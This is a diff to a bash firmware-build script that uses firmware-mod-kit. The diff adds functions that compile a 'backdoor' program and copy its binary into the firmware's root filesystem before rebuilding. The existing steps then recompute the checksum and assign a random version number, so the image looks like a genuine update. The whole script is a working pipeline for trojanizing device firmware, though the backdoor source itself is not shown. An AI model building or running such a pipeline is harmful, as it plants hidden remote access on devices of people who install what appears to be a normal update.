@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Globals:
-REPO_PATH=`dirname "$0"`
+REPO_CODE_PATH=`dirname "$0"`
 # Generate random version between 1 to 200.
 RANDOM_FIRMWARE_VERSION=$(( (RANDOM % 200) + 1 ))
 
@@ -14,6 +14,31 @@ FMK_DIR=$HOME'/tools/firmware-mod-kit-master'
 FMK_FIRMWARE_DIR='fmk'
 FMK_BUILD_FIRMWARE_SCRIPT='build-firmware.sh'
 FMK_OUTPUT_FIRMWARE='new-firmware.bin'
+
+compile_backdoor() {
+    echo "======================================="
+    echo "Compling the backdoor from it's sources"
+    echo "======================================="
+    pushd $REPO_CODE_PATH/backdoor > /dev/null
+    make release
+    if [[ $? -ne 0 ]]; then
+        echo "Failed to compile latest backdoor version, resuming with old version!"
+    fi
+    popd > /dev/null
+}
+
+insert_backdoor() {
+    echo "=============================="
+    echo "Inserting backdoor to firmware"
+    echo "=============================="
+    echo "Putting the backdoor binary in the firmware bin directory."
+    cp $REPO_CODE_PATH/backdoor/bin/bd $FMK_DIR/$FMK_FIRMWARE_DIR/rootfs/bin/
+    if [[ $? -ne 0 ]]; then
+        echo "Failed inserting backdoor to firmware, try to run with sudo."
+        echo "Stopping build process..."
+        exit
+    fi
+}
 
 compile_firmware() {
     echo "============================================="
@@ -37,7 +62,7 @@ fix_checksum() {
     echo "============================"
     echo "Fixing the firmware checksum"
     echo "============================"
-    python3 $REPO_PATH/scripts/update_checksum.py -u $FMK_DIR/$FMK_FIRMWARE_DIR/$FMK_OUTPUT_FIRMWARE
+    python3 $REPO_CODE_PATH/scripts/update_checksum.py -u $FMK_DIR/$FMK_FIRMWARE_DIR/$FMK_OUTPUT_FIRMWARE
 }
 
 # Note: to update firmware version, this script must be run as sudo.
@@ -49,8 +74,7 @@ update_firmware_version() {
 
     echo "Trying to update fimrware version to: $RANDOM_FIRMWARE_VERSION" 
     echo $RANDOM_FIRMWARE_VERSION > $firmware_version_file
-    update_result=$?
-    if [[ $update_result -ne 0 ]]; then
+    if [[ $? -ne 0 ]]; then
         echo "Couldn't update firmware version."
     fi
 
@@ -61,7 +85,6 @@ update_firmware_version() {
 
 save_firmware() {
     # New firmware version should be the first argument.
-    echo $firmware_version_file
     if [[ $# -ge 1 ]];
     then
         new_firmware_name=${FIRMWARE_NAME//version/$1}
@@ -77,6 +100,9 @@ save_firmware() {
 }
 
 main() {
+    compile_backdoor
+    insert_backdoor
+
     update_firmware_version
     firmware_version=$?
     compile_firmware
